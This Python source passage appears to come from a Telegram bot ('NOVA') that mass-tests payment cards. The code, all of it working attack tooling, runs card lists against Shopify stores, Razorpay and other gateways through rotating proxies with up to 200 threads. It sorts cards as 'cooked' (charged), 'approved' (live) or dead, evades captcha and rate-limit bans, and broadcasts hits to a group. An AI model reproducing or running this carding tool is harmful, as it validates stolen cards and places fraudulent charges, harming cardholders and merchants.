    # 1) Remove from live list
    with sites_lock:
        if site_obj in current_sites_ref:
            current_sites_ref.remove(site_obj)

    # 2) Blacklist for 24h (prevents re-entry mid-run)
    with CAPTCHA_COOLDOWN_LOCK:
        CAPTCHA_COOLDOWN[site_url] = time.time() + FAKE_BAN_SECONDS

    # 3) Chat message (no domain shown)
    try:
        safe_send(bot.send_message, chat_id,
                  f"🚫 Fake site removed (ID <code>{site_id}</code>) — "
                  f"{FAKE_VELOCITY_COUNT} charges in {int(FAKE_VELOCITY_WINDOW)}s",
                  parse_mode='HTML')
    except Exception:
        pass

    # 4) Owner DM (with domain)
    try:
        safe_send(bot.send_message, OWNER_KILL_PING,
                  f"🚨 <b>FAKE SITE REMOVED</b>\n"
                  f"🆔 ID: <code>{site_id}</code>\n"
                  f"🌐 <code>{site_url}</code>\n"
                  f"📋 {FAKE_VELOCITY_COUNT} cooks in {int(FAKE_VELOCITY_WINDOW)}s",
                  parse_mode='HTML')
    except Exception:
        pass



def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                               user_id, load_json_func, save_json_func, users_file,
                               hit_pref="both", dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    DECLINE_PATTERNS = [
        "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
        "PAYMENTS_CREDIT_CARD_BASE_GATEWAY_NOT_SUPPORTED",
        "PAYMENTS_CREDIT_CARD_BASE_INVALID_START_DATE_OR_ISSUE_NUMBER_FOR_DEBIT",
        "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
        "PAYMENTS_CREDIT_CARD_FIRST_NAME_BLANK",
        "PAYMENTS_CREDIT_CARD_LAST_NAME_BLANK",
        "PAYMENTS_CREDIT_CARD_GENERIC",
        "PAYMENTS_CREDIT_CARD_MONTH_INVALID_EXPIRY_MONTH",
        "PAYMENTS_CREDIT_CARD_NUMBER_BLANK",
        "PAYMENTS_CREDIT_CARD_NUMBER_INVALID",
        "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
        "PAYMENTS_CREDIT_CARD_SESSION_ID",
        "PAYMENTS_CREDIT_CARD_SESSION_ID_INVALID",
        "PAYMENTS_CREDIT_CARD_SESSION_ID_EXPIRED",
        "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_BLANK",
        "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
        "PAYMENTS_CREDIT_CARD_YEAR_EXPIRED",
        "PAYMENTS_CREDIT_CARD_YEAR_INVALID_EXPIRY_YEAR",
        "INCORRECT_NUMBER", "INVALID_NUMBER", "INVALID_EXPIRY_DATE",
        "EXPIRED_CARD", "INCORRECT_CVC", "INCORRECT_ZIP", "INCORRECT_ADDRESS",
        "CARD_DECLINED", "PROCESSING_ERROR", "CALL_ISSUER", "PICK_UP_CARD",
        "AUTHENTICATION_REQUIRED", "DO_NOT_HONOR", "FRAUD_SUSPECTED",
        "LOST_CARD", "STOLEN_CARD", "CARD_TESTING", "MERCHANT_RULE",
        "AMOUNT_TOO_LARGE", "AMOUNT_TOO_SMALL", "INVALID_CURRENCY",
        "PAYMENT_METHOD_UNSUPPORTED"
    ]

    def is_decline_response(response_text):
        upper = response_text.upper()
        for pattern in DECLINE_PATTERNS:
            if pattern in upper:
                return True
        if 'DECLINED' in upper: return True
        if 'INSUFFICIENT' in upper and 'FUNDS' in upper: return True
        if 'INCORRECT' in upper and any(k in upper for k in ('CVC','CVV','ZIP','ADDRESS')): return True
        if 'EXPIRED' in upper and 'CARD' in upper: return True
        if 'DO NOT HONOR' in upper: return True
        if 'FRAUD' in upper: return True
        return False

    send_every_hit = (get_user_preference(user_id) == "individual")
    total = len(ccs)
    results = {"cooked": [], "approved": [], "dead": [], "expired": [], "error": []}
    sites_lock = threading.Lock()
    temp_site_ban = {}
    TEMP_BAN_TIME = 600
    current_sites = site_list.copy()
    current_proxies = [p for p in proxies if not _proxy_is_banned(p)]

    # Reset velocity trackers for this run
    with _site_kill_lock:
        for s in current_sites:
            _site_cook_times.pop(s['url'], None)

    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    last_error_reason = None
    status_msg = start_msg

    # ---- Site cooldown helpers ----
    def is_site_on_cooldown(site_url):
        with CAPTCHA_COOLDOWN_LOCK:
            return CAPTCHA_COOLDOWN.get(site_url, 0) > time.time()

    def mark_site_cooldown(site_url, seconds):
        with CAPTCHA_COOLDOWN_LOCK:
            CAPTCHA_COOLDOWN[site_url] = time.time() + seconds

    def error_result(cc, reason):
        return {
            'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
            'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'site_obj': {},
            'proxy_used': None,
            'bin_info': get_bin_info(cc.split('|')[0]),
            'timestamp': datetime.now().isoformat()
        }

    # ------------------------------------------------------------------
    # Per-card worker
    # ------------------------------------------------------------------
    def check_card_concurrent(cc, site_list, proxy_list, max_attempts=1):
        nonlocal last_response, last_error_reason
        if is_stop_requested(chat_id, user_id):
            return error_result(cc, "Stopped by user"), True

        # ---- Pick initial site ----
        with sites_lock:
            now = time.time()
            candidates = []
            for s in site_list:
                url = s['url']
                if url in temp_site_ban and now < temp_site_ban[url]:
                    continue
                if is_site_on_cooldown(url):
                    continue
                candidates.append(s)
            if not candidates:
                return error_result(cc, "all sites on cooldown/ban"), False
            site_obj = random.choice(candidates)
            site_url = site_obj['url']
            site_name = site_obj.get('name', site_url)
            price = site_obj.get('price', '0.00')
            gateway = site_obj.get('gateway', 'Unknown')

        # ---- Pick initial proxy ----
        available_proxies = [p for p in proxy_list if not _proxy_is_banned(p)]
        if not available_proxies:
            return error_result(cc, "no live proxies"), False
        random.shuffle(available_proxies)
        proxy = available_proxies[0]

        # ---- Single call — gates.py rotates on 429 / captcha / dead-site ----
        try:
            api_resp = check_shopify_api(
                site_url, cc, proxy,
                all_proxies=available_proxies,
                all_sites=[s['url'] for s in site_list],
                max_attempts=3,
            )
        except Exception as e:
            return error_result(cc, f"gate exception: {str(e)[:80]}"), False

        if api_resp is None:
            return error_result(cc, "api timeout (hard)"), False

        response_text, raw_status, gateway_result = process_shopify_api_response(api_resp, price)
        last_response = response_text
        resp_up = response_text.upper()

        # gates.py reports which site actually answered (after rotation)
        actual_site_url = api_resp.get('site', site_url)
        actual_site_obj = next(
            (s for s in site_list if s['url'] == actual_site_url),
            site_obj
        )

        # ---------- VELOCITY FAKE-SITE CHECK ----------
        if raw_status == 'APPROVED' and ('ORDER_PLACED' in resp_up or 'CHARGED' in resp_up):
            killed, count = _observe_cook(actual_site_url)
            if killed:
                _remove_fake_site(bot, chat_id, actual_site_obj,
                                  current_sites, sites_lock)
                return error_result(cc, "site removed: velocity"), False

        # ---------- NO PRODUCT ----------
        if 'NO PRODUCT FOUND' in resp_up or 'PRODUCT NOT FOUND' in resp_up:
            with sites_lock:
                temp_site_ban[actual_site_url] = time.time() + TEMP_BAN_TIME
            return error_result(cc, "No product found"), False

        # ---------- TERMINAL — return whatever gates.py got ----------
        bin_info = get_bin_info(cc.split('|')[0])
        return {
            'cc': cc,
            'response': response_text,
            'status': raw_status,
            'gateway': gateway_result or gateway,
            'price': price,
            'site': actual_site_obj.get('name', actual_site_url),
            'site_url': actual_site_url,
            'site_obj': actual_site_obj,
            'proxy_used': proxy,
            'bin_info': bin_info,
            'timestamp': datetime.now().isoformat()
        }, False                

    # ------------------------------------------------------------------
    # Main execution
    # ------------------------------------------------------------------
    processed = 0
    start_time = time.time()
    last_update_time = time.time()
    status_msg = start_msg

    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            live_proxies = [p for p in current_proxies if not _proxy_is_banned(p)]
            future = executor.submit(check_card_concurrent, cc, current_sites, live_proxies, 5)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 15 if is_stop_requested(chat_id, user_id) else 120
                res, card_stopped = future.result(timeout=timeout)
                if card_stopped:
                    cc = futures[future]
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break

                final_status = res['status']

                if final_status == 'APPROVED':
                    if 'ORDER_PLACED' in res['response'].upper() or 'CHARGED' in res['response'].upper():
                        results['cooked'].append(res)
                        if send_every_hit and (hit_pref == "both" or hit_pref == "cooked"):
                            send_hit(bot, chat_id, res, user_id=user_id, dm_user_id=dm_target_user_id)
                    else:
                        results['approved'].append(res)
                        if send_every_hit and (hit_pref == "both" or hit_pref == "approved"):
                            send_hit(bot, chat_id, res, user_id=user_id, dm_user_id=dm_target_user_id)
                elif final_status == 'EXPIRED':
                    results['expired'].append(res)
                elif final_status == 'DECLINED':
                    results['dead'].append(res)
                elif final_status == 'ERROR':
                    if is_decline_response(res['response']):
                        results['dead'].append(res)
                    else:
                        results['error'].append(res)
                else:
                    results['error'].append(res)

            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append(error_result(cc, 'Timeout'))
            except Exception as e:
                cc = futures[future]
                results['error'].append(error_result(cc, str(e)))

            # ---- TIME-BASED HEARTBEAT ----
            now = time.time()
            should_update = (
                stopped
                or processed == len(futures)
                or (now - last_update_time >= 20)
                or (processed > 0 and processed % 50 == 0 and now - last_update_time >= 10)
            )
            if should_update:
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total)
                    lr = html.escape(str(last_response or "waiting..."))[:40]
                    if last_response and len(str(last_response)) > 40:
                        lr += "…"

                    live_proxy_count = sum(1 for p in current_proxies if not _proxy_is_banned(p))
                    banned_proxy_count = len(current_proxies) - live_proxy_count
                    inflight = max(0, len(futures) - processed)

                    msg_text = (
                        f"<b>🛍️ Shopify Multi‑Site</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Dead: {len(results['dead'])}  👋 Expired: {len(results['expired'])}\n"
                        f"⚠️ Errors: {len(results['error'])}\n\n"
                        f"🔌 Proxies: {live_proxy_count} live · {banned_proxy_count} banned\n"
                        f"⚙️ In-flight: {min(inflight, 50)} · queued: {max(0, inflight - 50)}\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>Unknownop</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Shopify progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ Shopify Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
        f"❌ Dead: {len(results['dead'])}  👋 Expired: {len(results['expired'])}\n"
        f"⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>Unknownop</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked cards', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('expired', '👋 Expired cards', 'expired'),
        ('dead', '❌ Dead cards', 'dead'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{r['cc']} | {r['response']}" for r in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked (stopped)")
        try:
            os.remove(fname)
        except:
            pass


# ============================================================================
# HIT SENDER – unchanged
# ============================================================================
def send_hit(bot, chat_id, res, user_id=None, dm_user_id=None):
    target_chat = dm_user_id if dm_user_id else chat_id

    if user_id:
        try:
            user = bot.get_chat(user_id)
            name = user.first_name or "User"
            username = user.username
            user_display = f"@{username}" if username else f'<a href="tg://user?id={user_id}">{html.escape(name)}</a>'
        except:
            user_display = f'<a href="tg://user?id={user_id}">User</a>'
    else:
        user_display = "Unknown"

    cc = res.get('cc', 'Unknown')
    response_text = res.get('response', 'Unknown')
    gateway = res.get('gateway', 'Unknown')
    price = res.get('price', '0.00')

    site_obj = res.get('site_obj', {})
    site_id = site_obj.get('id') if site_obj else None
    if site_id:
        site_display = f"ID {site_id}"
    else:
        site_url = res.get('site_url', '')
        if site_url:
            site_display = site_url.replace('https://','').replace('http://','').split('/')[0]
        else:
            site_display = res.get('site', 'N/A')

    bin_info = res.get('bin_info', {})
    bank = bin_info.get('bank', 'UNKNOWN')
    country = bin_info.get('country_name', 'UNKNOWN')
    flag = bin_info.get('country_flag', '🇺🇳')
    brand = bin_info.get('brand', 'UNKNOWN')
    card_type = bin_info.get('type', 'UNKNOWN')

    escaped_response = html.escape(response_text)

    # Simple classification based on response text
    final_status = 'DECLINED'
    if 'ORDER_PLACED' in response_text.upper() or 'CHARGED' in response_text.upper():
        final_status = 'COOKED'
    elif any(k in response_text.upper() for k in ['INSUFFICIENT', 'INCORRECT CVC', 'CARD_ADDED', 'ADDED SUCCESSFULLY']):
        final_status = 'APPROVED'
    elif 'DECLINED' in response_text.upper() or 'CARD_DECLINED' in response_text.upper():
        final_status = 'DECLINED'
    elif 'EXPIRED' in response_text.upper():
        final_status = 'EXPIRED'
    elif 'ERROR' in response_text.upper():
        final_status = 'ERROR'

    if "razorpay" in gateway.lower() and ("incorrect" in response_text.upper() or "cvv" in response_text.upper()):
        final_status = "DECLINED"
    if "stripe auth" in gateway.lower() and ("card added" in response_text.upper() or "added successfully" in response_text.upper()):
        final_status = "APPROVED"

    if final_status == "COOKED":
        title = "🔥 COOKED"
        group_header = "🔥  HIT DETECTED  🔥"
        status_display = "𝐂 𝐇 𝐑 𝐆 𝐄 𝐃"
        status_emoji = "💎"
    elif final_status == "APPROVED":
        if "INSUFFICIENT_FUNDS" in response_text.upper():
            group_header = "⚠️  LOW FUND DETECTED  ⚠️"
            status_display = "𝐀 𝐏 𝐏 𝐑 𝐎 𝐕 𝐄 𝐃"
            status_emoji = "✅"
            title = "✅ APPROVED (Live)"
        else:
            group_header = "✅  HIT DETECTED  ✅"
            status_display = "𝐀 𝐏 𝐏 𝐑 𝐎 𝐕 𝐄 𝐃"
            status_emoji = "✅"
            title = "✅ APPROVED (Live)"
    elif final_status == "EXPIRED":
        title = "👋 EXPIRED"
        group_header = "👋  EXPIRED  👋"
        status_display = "𝐄 𝐗 𝐏 𝐈 𝐑 𝐄 𝐃"
        status_emoji = "⌛"
    elif final_status == "ERROR":
        title = "⚠️ ERROR"
        group_header = "⚠️  ERROR  ⚠️"
        status_display = "𝐄 𝐑 𝐑 𝐎 𝐑"
        status_emoji = "⚠️"
    else:
        title = "❌ DECLINED"
        group_header = "❌  DECLINED  ❌"
        status_display = "𝐃 𝐄 𝐂 𝐋 𝐈 𝐍 𝐄 𝐃"
        status_emoji = "❌"

    user_msg = (
        f"<b>{title}</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"💳 <b>Card:</b> <code>{cc}</code>\n"
        f"📋 <b>Response:</b> {escaped_response}\n"
        f"🛡️ <b>Gateway:</b> {gateway} · <b>${price}</b>\n"
        f"🌐 <b>Site:</b> {site_display}\n"
        f"━━━━━━━━━━━━━━\n"
        f"🏦 <b>Bank:</b> <b>{bank}</b>\n"
        f"🌍 <b>Country:</b> {country} {flag}\n"
        f"💠 <b>Brand:</b> {brand} {card_type}\n"
        f"━━━━━━━━━━━━━━\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if len(user_msg) > 4096:
        user_msg = user_msg[:4090] + "…"
    queue_hit(bot, target_chat, user_msg)

    global FREE_GROUP_ID
    if FREE_GROUP_ID and target_chat != FREE_GROUP_ID:
        try:
            price_val = float(price)
            price_emoji = "💵" if price_val > 10 else "🛫"
        except:
            price_emoji = "💵"

        gateway_emoji = "🛒" if "shopify" in gateway.lower() else "🔗"

        group_msg = (
            f"{group_header}\n\n"
            f"➜ Status    • {status_display}  {status_emoji}\n"
            f"➜ Response  • {escaped_response}\n"
            f"➜ Price     • ${price} {price_emoji}\n"
            f"➜ Gateway   • {gateway} {gateway_emoji}\n"
            f"➜ User      • {user_display}"
        )
        group_msg += f"\n\n━━━━━━━━━━━━━━━━━━━\n<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
        queue_hit(bot, FREE_GROUP_ID, group_msg)

# ============================================================================
# GENERIC MASS CHECK ENGINE
# ============================================================================
def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                            proxies, user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    send_every_hit = (get_user_preference(user_id) == "individual")
    total = len(ccs)
    results = {"cooked": [], "approved": [], "declined": [], "expired": [], "error": []}
    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    status_msg = start_msg

    def worker(cc):
        nonlocal last_response
        if is_stop_requested(chat_id, user_id):
            return cc, "Stopped by user", "STOPPED"

        if proxies:
            msg, status, _ = gate_with_proxy_retry(gate_func, cc, proxies, gate_name)
        else:
            try:
                result = gate_func(cc, proxy=None)
                if isinstance(result, tuple) and len(result) == 2:
                    msg, status = result
                else:
                    msg, status = str(result), "ERROR"
            except Exception as e:
                msg, status = str(e), "ERROR"
        last_response = msg
        if status == 'ERROR' and any(k in msg.upper() for k in ['DECLINE', 'INSUFFICIENT', 'CARD', 'FUNDS', 'BRAND', 'PROCESSING']):
            status = 'DECLINED'
        return cc, msg, status

    processed = 0
    start_time = time.time()
    last_update_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            future = executor.submit(worker, cc)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 10 if is_stop_requested(chat_id, user_id) else 60
                cc, msg, status = future.result(timeout=timeout)
                if status == 'STOPPED':
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break
                bin_info = get_bin_info(cc.split('|')[0])

                if status == 'APPROVED':
                    res = {
                        'cc': cc,
                        'response': msg,
                        'gateway': gate_name,
                        'price': '0.00',
                        'site': 'API',
                        'site_url': 'API',
                        'site_obj': {},
                        'bin_info': bin_info,
                        'timestamp': datetime.now().isoformat()
                    }
                    if send_every_hit:
                        send_hit(bot, chat_id, res, user_id=user_id, dm_user_id=dm_target_user_id)

                    msg_upper = msg.upper()
                    cook_keywords = ['CHARGED', 'SUCCESS', 'ORDER PLACED', 'PAYMENT SUCCESSFUL',
                                     'THANK YOU', 'ORDER APPROVED', 'PAYMENT COMPLETED',
                                     'PURCHASED', 'CONFIRMED', 'CAPTURED']
                    if any(kw in msg_upper for kw in cook_keywords):
                        results['cooked'].append((cc, msg))
                    else:
                        results['approved'].append((cc, msg))

                elif status == 'DECLINED':
                    results['declined'].append((cc, msg))
                elif status == 'EXPIRED':
                    results['expired'].append((cc, msg))
                else:
                    results['error'].append((cc, msg))

            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append((cc, "Timeout"))
            except Exception as e:
                cc = futures[future]
                results['error'].append((cc, str(e)))

            now = time.time()
            if (processed % 50 == 0 or processed == len(futures) or stopped) and (now - last_update_time >= 10):
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total)
                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
                    msg_text = (
                        f"<b>⚡ {gate_name}</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Declined: {len(results['declined'])}  👋 Expired: {len(results['expired'])}\n"
                        f"⚠️ Errors: {len(results['error'])}\n\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Gate progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ ' + gate_name + ' Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
        f"❌ Declined: {len(results['declined'])}  👋 Expired: {len(results['expired'])}\n"
        f"⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('expired', '👋 Expired', 'expired'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{cc} | {msg}" for cc, msg in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked")
        try:
            os.remove(fname)
        except:
            pass

# ============================================================================
# RAZORPAY MASS CHECK (unchanged)
# ============================================================================
def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
                                user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    send_every_hit = (get_user_preference(user_id) == "individual")
    total_cards = len(ccs)
    results = {"cooked": [], "approved": [], "declined": [], "error": []}
    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    status_msg = start_msg

    instant_remove_keywords = [
        "the server encountered an error",
        "international payments not supported",
        "international payment not supported",
    ]
    site_error_keywords = [
        "account number is mandatory",
        "card transactions are not enabled",
        "temporarily blocked",
        "merchant account",
        "payment not allowed",
        "invalid merchant",
        "transaction not permitted",
        "unable to process",
        "merchant disabled",
        "account suspended",
        "bank not supported",
        "payment method not allowed",
        "sorry, we could not process",
        "something went wrong",
    ]

    def worker(card):
        nonlocal last_response
        if is_stop_requested(chat_id, user_id):
            return card, "Stopped by user", "STOPPED"
        for site in sites:
            if is_stop_requested(chat_id, user_id):
                return card, "Stopped by user", "STOPPED"
            proxy = random.choice(proxies) if proxies else None
            msg, status = check_razorpay(card, proxy=proxy, site=site)
            last_response = msg

            if status == "ERROR":
                msg_lower = msg.lower()
                if any(kw in msg_lower for kw in instant_remove_keywords):
                    sites.remove(site)
                    save_rz_sites(sites)
                    reset_rz_fail_count(site)
                    queue_hit(bot, chat_id, f"🗑️ Site <code>{site}</code> instantly removed – {msg[:60]}")
                    continue
                is_site_error = any(kw in msg_lower for kw in site_error_keywords)
                if is_site_error:
                    removed = increment_rz_fail_count(site)
                    if removed:
                        queue_hit(bot, chat_id, f"⚠️ Site <code>{site}</code> removed after 3 consecutive errors.")
                    continue
                else:
                    return card, msg, "DECLINED"
            else:
                reset_rz_fail_count(site)
                return card, msg, status
        return card, "All sites failed", "ERROR"

    processed = 0
    start_time = time.time()
    last_update_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            future = executor.submit(worker, cc)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 10 if is_stop_requested(chat_id, user_id) else 60
                cc, msg, status = future.result(timeout=timeout)
                if status == 'STOPPED':
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break
                bin_info = get_bin_info(cc.split('|')[0])

                if status == 'APPROVED':
                    res = {
                        'cc': cc,
                        'response': msg,
                        'gateway': 'Razorpay',
                        'price': '1.00',
                        'site': site if site else 'Razorpay',
                        'site_url': site if site else 'N/A',
                        'site_obj': {},
                        'bin_info': bin_info,
                        'timestamp': datetime.now().isoformat()
                    }
                    if send_every_hit:
                        send_hit(bot, chat_id, res, user_id=user_id, dm_user_id=dm_target_user_id)

                    msg_upper = msg.upper()
                    if any(kw in msg_upper for kw in ['CHARGED', 'SUCCESS', 'PAYMENT_SUCCESS']):
                        results['cooked'].append((cc, msg))
                    else:
                        results['approved'].append((cc, msg))

                elif status == 'DECLINED':
                    results['declined'].append((cc, msg))
                else:
                    results['error'].append((cc, msg))

            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append((cc, "Timeout"))
            except Exception as e:
                cc = futures[future]
                results['error'].append((cc, str(e)))

            now = time.time()
            if (processed % 50 == 0 or processed == len(futures) or stopped) and (now - last_update_time >= 10):
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total_cards)
                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
                    msg_text = (
                        f"<b>💎 Razorpay ₹1 Mass Check</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Declined: {len(results['declined'])}  ⚠️ Errors: {len(results['error'])}\n\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Razorpay progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ Razorpay Mass Check Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
        f"❌ Declined: {len(results['declined'])}  ⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

